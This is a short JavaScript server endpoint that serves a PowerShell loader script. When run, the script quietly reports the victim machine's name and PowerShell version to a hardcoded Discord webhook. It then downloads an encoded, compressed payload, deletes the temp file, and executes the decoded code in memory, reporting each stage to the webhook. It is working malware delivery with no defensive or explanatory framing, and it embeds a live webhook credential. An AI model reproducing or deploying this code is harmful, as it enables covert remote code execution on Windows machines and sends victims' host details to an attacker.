const WH = 'https://discord.com/api/webhooks/1566832143152316450/ZmyQo0Stt6Qmx3BaDi0wU2qtPxq8-QwVJwfwdXvjiZ5DS-hltxSopqgdBacUIrUTWE6K';

module.exports = (req, res) => {
  const proto = req.headers['x-forwarded-proto'] || 'https';
  const base = proto + '://' + req.headers.host;
  const ps =
    "$ErrorActionPreference='SilentlyContinue';"
    + "$wh='" + WH + "';"
    + "function P($m){try{$b=@{content=[string]$m}|ConvertTo-Json;Invoke-RestMethod $wh -Method Post -Body $b -ContentType 'application/json' -TimeoutSec 15 -UseBasicParsing}catch{}};"
    + "P ('start : '+$env:COMPUTERNAME+' | '+$PSVersionTable.PSVersion);"
    + "$f=Join-Path $env:TEMP ('p'+[guid]::NewGuid().ToString('N').Substring(0,6)+'.txt');"
    + "try{"
    + "Invoke-WebRequest '" + base + "/a?_=" + Date.now() + "' -OutFile $f -UseBasicParsing -TimeoutSec 40;"
    + "P ('dl : '+((Get-Item $f).Length)+' b');"
    + "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String([IO.File]::ReadAllText($f)));"
    + "$d=New-Object IO.Compression.DeflateStream($s,[IO.Compression.CompressionMode]::Decompress);"
    + "$o=New-Object IO.MemoryStream;$d.CopyTo($o);"
    + "Remove-Item $f -Force;"
    + "P 'loader : ok';"
    + "&([scriptblock]::Create([Text.Encoding]::UTF8.GetString($o.ToArray())))"
    + "}catch{P ('loader err : '+$_.Exception.Message)}";

  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store, max-age=0');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.status(200).send(ps);
};
